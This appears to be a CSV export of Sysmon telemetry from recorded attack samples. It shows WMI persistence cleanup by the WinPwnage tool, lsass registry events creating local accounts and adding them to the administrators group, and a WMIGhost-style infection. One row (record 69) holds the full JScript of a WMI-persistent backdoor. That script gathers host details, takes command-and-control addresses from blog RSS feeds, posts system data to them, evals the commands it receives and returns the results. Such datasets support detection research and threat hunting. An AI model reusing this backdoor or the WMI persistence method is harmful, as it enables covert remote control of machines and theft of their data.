,Catalog,Category,Channel,Computer,Correlation,EventID,EventRecordID,Execution_ProcessID,Execution_ThreadID,Guid,Installer,Keywords,Level,Lspname,Opcode,Provider_Guid,Provider_Name,Security_UserID,Task,TimeCreated_SystemTime,Version,Commandline,Company,Currentdirectory,Description,Fileversion,Hashes,Image,Integritylevel,Logonguid,Logonid,Parentcommandline,Parentimage,Parentprocessguid,Parentprocessid,Processguid,Processid,Product,Rulename,Terminalsessionid,User,Utctime,Creationutctime,Targetfilename,Details,Eventtype,Targetobject,Imageloaded,Signature,Signaturestatus,Signed,Destinationhostname,Destinationip,Destinationisipv6,Destinationport,Destinationportname,Initiated,Protocol,Sourcehostname,Sourceip,Sourceisipv6,Sourceport,Sourceportname,Originalfilename,Destination,Name,Operation,Type,Consumer,Filter,Eventnamespace,Query,Calltrace,Grantedaccess,Sourceimage,Sourceprocessguid,Sourceprocessid,Sourcethreadid,Targetimage,Targetprocessguid,Targetprocessid
45,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16119,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:54.887534600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer WHERE Name=""BotConsumer23"" DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-0010A1141700},2432,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.793,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
46,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,20,16120,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,20,2019-05-11T17:58:54.903159600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:54.903,,,,WmiConsumerEvent,,,,,,,,,,,,,,,,,,," ""c:\\Windows\\System32\\cmd.exe"""," ""BotConsumer23""",Deleted,Command Line,,,,,,,,,,,,,
47,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,19,16121,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,19,2019-05-11T17:58:54.981284600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:54.981,,,,WmiFilterEvent,,,,,,,,,,,,,,,,,,,," ""BotFilter82""",Deleted,,,," ""root\\cimv2"""," ""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",,,,,,,,,
48,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16122,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:55.028159600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter WHERE Name=""BotFilter82"" DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-0010E6241700},4084,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.918,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
49,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,21,16123,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,21,2019-05-11T17:58:55.090659600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:55.090,,,,WmiBindingEvent,,,,,,,,,,,,,,,,,,,,,Deleted,," ""CommandLineEventConsumer.Name=\""BotConsumer23\"""""," ""__EventFilter.Name=\""BotFilter82\""""",,,,,,,,,,,
50,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16124,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:55.153159600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=""BotFilter82""' DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-001047331700},3016,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.996,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
51,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134364,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T09:28:22.280329500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 09:28:22.279,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
52,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134365,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T09:28:22.280355700Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 09:28:22.279,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
53,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134366,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T09:28:42.976924500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 09:28:42.976,,,,DeleteKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
54,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134384,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:03:04.489453500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:03:04.489,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
55,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134385,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:03:04.489480400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:03:04.489,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
56,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134398,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:33:31.843453100Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:33:31.842,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\sqlsvc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
57,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134399,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:33:31.843489400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:33:31.842,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\sqlsvc\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
58,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134403,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:45:30.650632400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 10:45:30.650,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
59,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134404,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:45:33.802858700Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 10:45:33.802,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
60,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134405,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:54:20.005437300Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 10:54:20.005,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
61,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134406,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:54:20.005776500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:54:20.005,,,,DeleteKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
62,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134407,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:54:22.974305100Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:54:22.973,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
63,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134408,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:54:22.974353600Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:54:22.973,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
64,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134409,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T11:00:13.713790400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 11:00:13.713,,,,DeleteKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
65,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134410,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T11:00:24.602481800Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 11:00:24.601,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
66,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134411,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T11:00:24.602530400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 11:00:24.601,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
67,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134412,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T11:02:16.084931900Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Account Added or Deleted from Local Administrators Group,,,2020-09-04 11:02:16.084,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
68,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,1,7194,1828,372,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-04-03T18:11:54.098352000Z,5,"""C:\Users\user01\Desktop\WMIGhost.exe"" ",?,C:\Users\user01\Desktop\,?,?,"MD5=0DF40B226A4913A57668B83B7C7B443C,IMPHASH=8812FF21AEB160E8800257140ACAE54B",C:\Users\user01\Desktop\WMIGhost.exe,High,{365ABB72-F44E-5CA4-0000-00202BAF0A00},0x00000000000aaf2b,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-F456-5CA4-0000-001095090B00},3032,{365ABB72-F76A-5CA4-0000-0010FA0D1700},3328,?,,2,PC04\IEUser,2019-04-03 18:11:54.058,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
69,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,20,7195,1828,3164,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,20,2019-04-03T18:11:54.178467200Z,3,,,,,,,,,,,,,,,,,,,,PC04\IEUser,2019-04-03 18:11:54.178,,,,WmiConsumerEvent,,,,,,,,,,,,,,,,,,," ""var sXmlUrl=\""http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\"";var sOwner='XDD';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\""%PCI%\\\"" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\""scrcons.exe\\\""'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');var re=/<title>@(.*)@<\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\''+commands[i].id+'\\':\\''+escape(result)+'\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();"""," ""ProbeScriptFint""",Modified,Script,,,,,,,,,,,,,
70,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,21,7197,1828,3164,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,21,2019-04-03T18:11:54.198496000Z,3,,,,,,,,,,,,,,,,,,,,PC04\IEUser,2019-04-03 18:11:54.198,,,,WmiBindingEvent,,,,,,,,,,,,,,,,,,,,,Modified,," ""\\\\.\\root\\subscription:ActiveScriptEventConsumer.Name=\""ProbeScriptFint\"""""," ""\\\\.\\root\\subscription:__EventFilter.Name=\""ProbeScriptFint\""""",,,,,,,,,,,
71,,,Microsoft-Windows-Sysmon/Operational,PC04.example.corp,,1,7203,1828,372,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-04-03T18:12:00.016862400Z,5,C:\Windows\system32\wbem\scrcons.exe -Embedding,Microsoft Corporation,C:\Windows\system32\,WMI Standard Event Consumer - scripting,6.1.7600.16385 (win7_rtm.090713-1255),"MD5=6AEC20B9D4C1AB6F1AB297F28EB6BF93,IMPHASH=CCEC86CC0D16062391CC627BC9466A62",C:\Windows\System32\wbem\scrcons.exe,System,{365ABB72-701F-5CA5-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-7020-5CA5-0000-0010ED6A0000},596,{365ABB72-F76F-5CA4-0000-0010AA201700},2636,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-04-03 18:11:59.996,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
